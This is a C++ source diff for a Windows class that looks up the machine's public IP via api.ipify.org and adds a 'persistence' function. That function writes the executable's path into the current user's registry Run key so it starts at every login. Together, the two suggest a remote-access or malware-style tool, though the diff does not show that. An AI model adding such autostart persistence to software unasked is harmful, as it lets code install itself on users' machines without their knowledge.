@@ -30,7 +30,7 @@ void SetColor(int value)
  std::string Auto::get_ip()
  {
 	 const std::string url = "api.ipify.org";
-
+	
 	 std::string website_HTML;
 	 char ip_address[16];
 	 std::locale local;
@@ -38,8 +38,7 @@ void SetColor(int value)
 	 int lineIndex = 0, posIndex = 0;
 	 int i = 0, bufLen = 0, j = 0, lineCount = 0;
 	 char buffer[10000];
-
-	 WSADATA wsaData;
+	
 	 SOCKET Socket;
 	 SOCKADDR_IN SockAddr;
 	 int rowCount = 0;
@@ -51,11 +50,18 @@ void SetColor(int value)
 
 
 	 Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-	 host = gethostbyname(url.c_str());
-
-	 SockAddr.sin_port = htons(80);
-	 SockAddr.sin_family = AF_INET;
-	 SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);
+	 
+	
+		 host = gethostbyname(url.c_str());
+		 if (host == nullptr)
+		 {
+			 closesocket(Socket);
+			 return "0.0.0.0";
+		 }
+		 SockAddr.sin_port = htons(80);
+		 SockAddr.sin_family = AF_INET;
+		 SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);
+	
 
 	 if (connect(Socket, (SOCKADDR*)(&SockAddr), sizeof(SockAddr)) != 0) {
 		 std::cout << "Could not connect";
@@ -74,6 +80,7 @@ void SetColor(int value)
 	 }
 
 	 closesocket(Socket);
+
 	 std::cout << "\n\n\n";
 	 for (size_t i = 0; i < website_HTML.length(); ++i) website_HTML[i] = tolower(website_HTML[i], local);
 
@@ -98,4 +105,22 @@ void SetColor(int value)
 		 lineIndex++;
 	 }
 	 return ip_address;
+ }
+ bool Auto::persistence(const wchar_t* keyname)
+ {
+	 TCHAR szPath[MAX_PATH];
+	 GetModuleFileName(NULL, szPath, MAX_PATH);
+	 HKEY newValue;
+	 LONG lResult = RegOpenKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue);
+	 BOOL fsuccess = (lResult == 0);
+	 if (fsuccess)
+	 {
+		 RegSetValueEx(newValue, (LPCWSTR)keyname, 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
+		 RegCloseKey(newValue);
+		 return 1;
+	 }
+	 else
+	 {
+		 return 0;
+	 }
  }
